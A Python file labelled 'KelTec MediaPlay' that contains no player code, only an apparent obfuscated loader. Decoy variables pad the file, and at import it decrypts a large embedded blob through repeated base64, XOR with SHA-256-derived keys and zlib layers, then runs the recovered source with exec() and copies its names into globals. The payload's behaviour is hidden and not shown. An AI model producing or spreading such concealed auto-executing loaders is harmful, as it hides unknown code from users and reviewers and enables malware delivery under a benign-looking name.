# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 744879 ^ 703333
_lx1_1 = len("68d435")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-947137)
_lx3_3 = 108279 * 0
_lx4_4 = 878180 ^ 650069
_K = '03d7baf90191ee3b482c13c798f4ace324d6358001c8681dc5f9de5c870d22ce'
_M = 'f5MiW24VX2Ijg1q3D4kc4mltA60dGbC7leldICLLIyUhl2kVNxAZZyyFAeYIjxzibzgErhFHsbnFtFhwfJ5wci+RPx01Rx9sfYdZ'
_D = '=cxt4OVDEPCFS6n6i/MGT63q+/oaEF0/tJGhOxaD56XhtNIc4X9Wj2q1fg30Bu2p85Zayo8V0W72Q0gyB2LGA4wpZrrF+DiuOjPeBNA6CPCw7+rnvyKJMhEdz7JD5QHbMZXZrqGrJURqyuBhyE2AInlpLct3zBLYf764fuhrcm7UGmn19TXsKN/rdQrKIp+HlEi9HkpI4rE+H0xDsLtDFZ3OP5o8L6aUQGYwFRcq8xUN8onuW4fKwM7CXhn1A89xUWSrCR9rkUfTQ9b69QEcX6uawqUeusptJ6uINDJhWBbbnCz6ODdTPmTiZovStqFjgIk2DyAnOuJIHSWs02SOKOSomwOzNe2yUjEyckJ01ajTM3O+C6ARTETFM8H97eXSCZyh1pbezxTP0jgHYHo5LH+jVPAf7OpJ2QcZbWk9Xf1PdjtmS+n5KVF9I6CE3W8MmkQNAZFt+T44CLxDiMsyqnYkRlBr3pWtK3eES3Yze2EDt/LSGRph0IsfY4xbZXrEusWilx5H8rFF4y3BKihTmcWZR+ZaSRG+ozVSC5b4pUTZ6jO0DNTu/PqnLvbEE8G0YbZXKDq8PJvC4J39FjI39LSYz1lsbD8nxYx6GsJCRk6/yaTOf0fwq/Vnbi1Wdmy5P8Gm9fQbDoq2qjAt2gXd9cYJ3WJ43XL1EGQcnxbslmBRp8YsTqZ+8grs4cqV2C0jv7eexwK3dzImBuBIUUelDxUqHglQvpc5JZTFSoyrVfgwKlPFA/IoTKV1cKXQ1s6qehKuI6irL4IXEfhFXtDJsjxITMVQl8djBoz+C+GcvqOUObhoJsv4GrfVlRvaCsLwrwadJkpS5OTH5szGfvABMwE+fo8+DeG/8hC812SepP2GgyXAmeNTxtTmaSEq+/+egMwZwd7GEi443nPSmI7gkEY1JtQ/9wbztK/Q1jsUMnHKjOwmHRB5fNNSIW2DFX8JNGjAYn5Ex3OcnW90rKYJdLuJd2QkuFnbpFBkDy9/ep5Xil0AqEzuF1jcBMZZcwrdIwJoONat+lkv71AafN/kWLbexm23s3aOvHS7L9nUpkLsz9a8SLzyByTlgqE/gwz3cikR/n16jCecp5GW0T348UOa9xRGvXzJHBoQij19s5B71yVkb+LiYPM3f445qEaNqNNWKb2kxDGamHr7f3q0ekJYeOEk6QJS0aPI21BaqRLyrf78s3uOVDJiqYSU9TglYP9P56CBoMw0RDV8zTObe+kvjpzZK7Xnk7v28dUfQV7cCeDUGI5KcooRmwOg8efAjMhy1Y/dAL3SdbrLsy+32EUSgRt980hdqRVoMRPw7iOjKEuc1HPK3iiYwzNpKyY7urT65/4yljqdNtgQ6lngAuZB1T1tXdBmSnYce5uxeKz/XAYnRMzA+tdpVE+zLZNdEe7AxFUhPumMHdheR95n1DLxD/rOHNGK5sbn9RhEcnxvMgxyn7p83bRaPM5+bnGtVnXyx4LYvXf8y279udeL1cOkjJ+w648+NgaL0lWia4ACbiiJNxa8i12zbtTXW8hO3vzICo5x+CokhwMWtIlDg7KV3H+4EypwLhMnGIVUxrBB2tDsOEcgRRkhQYrGuDD5Y3J4dZtl9FbuKUTKqbK8FGGnWTp5l4dyqW1jrevagzT80/KLiIw5OqSjDMceZXrbnFOYfuuLQXHAtmQsCccHmNKiU2XcuiSGmrsiKUOMxQGeggCeH9m3JPJO5l1tPDDGmIrRLI1WC4UFAltCEi542kevLDlkoIv/uPd8pwu877drtxrp2bH8TkIhLfttB/skVznXm5bXdHFOXiNm5099txpCz3Ookv4Q9+VIlUa3SL51NObL+qubMlaRXC59ss3mOlnd'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})